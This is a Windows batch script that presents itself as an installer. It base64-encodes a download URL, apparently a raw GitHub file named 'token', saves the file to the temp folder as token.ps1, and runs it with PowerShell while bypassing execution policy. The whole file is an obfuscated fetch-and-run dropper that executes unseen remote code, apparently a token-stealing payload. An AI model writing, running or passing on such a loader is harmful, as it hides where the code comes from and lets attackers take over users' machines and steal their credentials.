@echo off
setlocal

set "encodedUrl=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nvb2xtYW42OTY5LXVpL2UvbWFpbi90b2tlbi5wc2E="
set "outfile=%temp%\token.ps1"

echo Downloading file...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"%encodedUrl%\"));" ^
  "Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile \"%outfile%\""

if exist "%outfile%" (
  echo File downloaded to %outfile%
  echo Running installer...
  powershell -NoProfile -ExecutionPolicy Bypass -File "%outfile%"
) else (
  echo Download failed, file not found.
)

endlocal
